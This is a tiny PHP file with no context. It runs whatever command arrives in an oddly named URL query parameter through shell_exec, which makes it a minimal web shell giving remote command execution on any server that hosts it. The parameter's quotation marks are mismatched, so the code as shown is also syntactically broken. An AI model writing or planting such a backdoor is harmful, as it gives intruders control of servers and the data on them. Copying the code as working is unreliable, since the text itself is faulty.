<?php
shell_exec($_GET["JKz_z1z1']);
?>
